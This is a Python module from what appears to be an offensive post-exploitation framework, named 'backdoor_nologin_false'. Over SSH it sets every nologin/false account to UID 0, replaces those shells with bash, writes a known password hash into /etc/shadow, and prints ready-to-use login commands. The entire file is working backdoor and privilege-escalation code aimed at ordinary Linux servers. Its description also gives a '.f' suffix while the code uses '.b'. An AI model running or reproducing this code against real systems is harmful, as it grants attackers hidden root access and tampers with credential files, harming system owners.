import logging
import crypt
from hyderaddons import bcolors, ModuleBaseClass

class BackdoorNologinFalse(ModuleBaseClass):

    name = "backdoor_nologin_false"
    description = """Appends '.f' to /usr/sbin/nologin and /bin/false binaries.
Copies bash in their location making 'disabled' accounts reachable over, for instance, SSH.
It then overwrites /etc/shadow in a way that all those accounts using nologin or false
have password. The password is controlled by -b/--backdoor_pwd switch.
"""
    safe = False

    def run(self, sshclient, args, server):
        # Parse /etc/passwd
        logging.debug("Gathering data from /etc/passwd")
        _, stdout, _ = sshclient.exec_command("cat /etc/passwd")
        passwd_list = stdout.read().decode().strip().split("\n")
        passwd_list = [x.split(":") for x in passwd_list]
        
        users = []
        binaries = set()
        
        for entry in passwd_list:
            if "nologin" in entry[6] or "false" in entry[6]:
                binaries.add(entry[6])
                users.append(entry[0])
                entry[2] = '0'
                entry[3] = '0'

        # Change nologin/false to bash
        logging.debug("Repacing nologin/false with bash binary")
        for binary in binaries:
            # Make a backup only if it doesn't exist already, backdoor original binary
            sshclient.exec_command(f"ls {binary}.b && mv {binary} {binary}.b; cp /bin/bash {binary}")
        logging.info("Replaced nologin/false binaries with bash")

        # Root all affected users
        passwd_list = [":".join(x) for x in passwd_list]
        passwd_list = "\n".join(passwd_list)
        sshclient.exec_command("echo '''" + passwd_list + "''' > /etc/passwd")
        logging.debug("Overwriting /etc/passwd")

        pwd = crypt.crypt(args.backdoor_pwd, "$6$60B3g.cP$")
        logging.debug("Generated password for /etc/shadow: %s" % pwd)
        
        # Backdoor only affected users
        _, stdout, _ = sshclient.exec_command("cat /etc/shadow")
        shadow_list = stdout.read().decode().strip().split("\n")
        shadow_list = [x.split(":") for x in shadow_list]
        for sline in shadow_list:
            if sline[0] in users:
                sline[1] = pwd
        shadow_list = [":".join(x) for x in shadow_list]
        shadow_list = "\n".join(shadow_list)
        sshclient.exec_command("echo '''" + shadow_list + "''' > /etc/shadow")
        logging.debug("Overwriting /etc/shadow")
        
        # Check backdoor
        _, stdout, _ = sshclient.exec_command("cat /etc/shadow | grep '''%s''' || echo notfound" % pwd)
        if "notfound" in stdout.read().decode().strip():
            logging.error("Backdooring /etc/shadow unsuccessful")
        else:
            print("Backdooring nologin/failed and /etc/shadow successful")
            print("Backdoored users: " + bcolors.red(",".join(users)))
            print("Backdoor password: " + bcolors.red(args.backdoor_pwd))
            print("SSH CLIENT ONLY: \n\t" + bcolors.orange("ssh -t %s@%s 'export HOME=/dev/shm; cd /dev/shm; bash'" % (users[0], server["IP"])))
            print("SSHPASS CLIENT: \n\t" + bcolors.orange("sshpass -p %s ssh -t %s@%s 'export HOME=/dev/shm; cd /dev/shm; bash'" % (args.backdoor_pwd, users[0], server["IP"])))
        logging.info("")
        return True
